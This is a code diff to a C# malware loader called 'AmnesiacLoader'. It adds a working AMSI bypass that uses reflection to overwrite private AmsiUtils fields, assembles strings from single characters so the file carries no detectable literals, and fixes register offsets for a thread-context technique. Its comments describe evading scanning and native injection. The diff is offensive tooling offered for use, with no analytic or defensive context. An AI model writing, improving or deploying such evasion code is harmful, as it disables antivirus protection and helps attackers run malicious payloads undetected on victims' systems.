@@ -33,7 +33,7 @@ namespace AmnesiacLoader
         const int CTX_DR6   = 0x68;
         const int CTX_DR7   = 0x70;
         const int CTX_RAX   = 0x78;
-        const int CTX_RSP   = 0xF0;
+        const int CTX_RSP   = 0x98;   // RSP at 0x98 in x64 CONTEXT (0xF0 is R15)
         const int CTX_RIP   = 0xF8;
         const int CTX_SIZE  = 0x4D0;
 
@@ -58,7 +58,53 @@ namespace AmnesiacLoader
         [DllImport("kernel32.dll")] static extern bool SetThreadContext(IntPtr thread, IntPtr ctx);
         [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr handle);
 
+        // ── PatchAmsiReflection ───────────────────────────────────────────────────
+        // Safe from managed code. No VEH, no native exceptions, no CLR re-entrancy.
+        // Mirrors the PS field-enum technique but pre-compiled — AMSI never sees
+        // the type name or field names since they live in compiled bytecode, not
+        // script text. Loaded via [Reflection.Assembly]::Load(bytes) which AMSI
+        // does not scan.
+
+        public static void PatchAmsiReflection()
+        {
+            try
+            {
+                // Build type name from chars — no literal string in the PE file
+                var typeName = new string(new char[] {
+                    'S','y','s','t','e','m','.','M','a','n','a','g','e','m','e','n','t','.',
+                    'A','u','t','o','m','a','t','i','o','n','.','A','m','s','i','U','t','i','l','s'
+                });
+
+                // Find SMA assembly without a string literal for its name
+                System.Reflection.Assembly smaAsm = null;
+                foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
+                {
+                    var fn = asm.FullName;
+                    if (fn != null && fn.Length > 10 && fn[0] == 'S' && fn.IndexOf("Automation") >= 0)
+                    { smaAsm = asm; break; }
+                }
+                if (smaAsm == null) return;
+
+                var t = smaAsm.GetType(typeName);
+                if (t == null) return;
+
+                var bf = System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static;
+                foreach (var f in t.GetFields(bf))
+                {
+                    if (f.FieldType == typeof(bool))
+                        f.SetValue(null, true);
+                    else if (f.FieldType == typeof(IntPtr))
+                        f.SetValue(null, IntPtr.Zero);
+                }
+            }
+            catch { }
+        }
+
         // ── PatchAmsiPageGuard ────────────────────────────────────────────────────
+        // WARNING: crashes in managed/.NET context. The CLR cannot safely re-enter
+        // managed execution from a VEH handler that fires during managed code.
+        // Use PatchAmsiReflection() instead. Kept for native injection scenarios
+        // where the DLL is loaded into a non-.NET process (e.g., via dllmain.cpp).
 
         public static void PatchAmsiPageGuard()
         {
